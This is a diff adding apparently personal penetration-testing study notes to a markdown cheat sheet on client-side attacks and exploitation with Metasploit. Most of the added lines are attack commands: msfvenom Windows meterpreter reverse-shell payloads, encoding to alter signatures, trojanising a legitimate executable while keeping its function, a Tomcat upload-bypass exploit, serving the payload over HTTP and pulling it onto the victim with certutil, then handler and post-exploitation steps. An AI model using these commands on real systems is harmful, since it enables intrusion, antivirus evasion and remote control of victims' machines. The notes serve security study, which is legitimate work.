@@ -104,4 +104,56 @@
 # Client-Side Attacks
 
 ##### Payloads
+- `msfvenom --list payload` -- list the payload
+- `msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -f exe > /path/to/payload.exe`
+- `msfvenom --list formats`
+- set up hander (before executing payload)
+	- use multi/handler
+	- set payload windows/x64/meterpreter/reverse_tcp
+	- set LHOST 10.12.12.1
+	- set LPORT 1234
+	- run
+- Encoding is the process of modifying the payload shellcode with the objective of modifying the payload signature
+- `msfvenom --list encoders`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe > /path/to/payload.exe`
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe -x /path/to/exe/file/for/injection > /path/to/payload.exe` -- to inject the payload in portable executable
+- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -i 10 -e x86/shikata_ga_mai -f exe -k -x /path/to/exe/file/for/injection > /path/to/payload.exe` -- to inject the payload in portable executable while keeping original functionality of exe
+
+---
+---
+
+# Exploitation
+
+###### Windows Exploitation
+- Winrm
+	- `auxiliary/scanner/winrm/winrm_login`
+	- `auxiliary/scanner/winrm/winrm_cmd`
+- Apache V58.5.19
+	- `exploit/multui/http/tomcat_jsp_upload_bypass`
+	- `set payload java/jsp_shell_bind_tcp`
+	- `set SHELL cmd`
+	- the above will only give shell for meterpreter we need to upload the exe
+	- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP] LPORT=1234 -f exe > meterpreter.exe`
+	- `python3 -m http.server 80` 
+	- on shell 
+	- `certutil -urlcache -f http://[your IP]/meterpreter.exe meterpreter.exe`
+	- now make .rc file
+		- vim handler.rc
+		- use multi/handler
+		- set PAYLOAD windows/meterpreter/reverse_tcp
+		- set LPORT 1234
+		- set LHOST [YOUR IP]
+		- run
+	- msfconsole -r handler.rc
+	- on shell .\meterpreter.exe
+###### Linux Exploitation
+- always search for versions (eg., libssh-ssh, haraka smtp) instead of name
+
+###### Post Exploitation Fundamentals
+- checksum md5 /bin/bash -- to give md5 hash
+- search /  -f * flag * 
+- `use post/multi/manage/shell_to_meterpreter` -- to shell to meterpreter OR
+	- sessions -u (session id)
+
+###### Windows Post Exploitation
 - 
